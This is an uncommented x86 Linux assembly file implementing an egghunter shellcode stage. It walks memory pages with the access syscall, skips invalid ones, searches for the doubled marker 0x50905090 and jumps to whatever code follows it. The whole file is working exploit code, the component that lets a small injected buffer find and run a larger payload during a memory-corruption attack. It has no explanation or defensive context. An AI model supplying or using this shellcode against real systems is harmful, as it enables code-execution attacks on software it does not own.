

global _start

section .text
_start:

	mov ebx, 0x50905090
	xor ecx, ecx
	mul ecx

page_alignment:
	or dx, 0xfff

address_inspection:
	inc edx
	pushad
	lea ebx, [edx+4]
	mov al, 0x21
	int 0x80
	cmp al, 0xf2
	popad
	jz page_alignment
	
	cmp [edx], ebx
	jnz address_inspection
	cmp [edx+4], ebx
	jnz address_inspection
	jmp edx


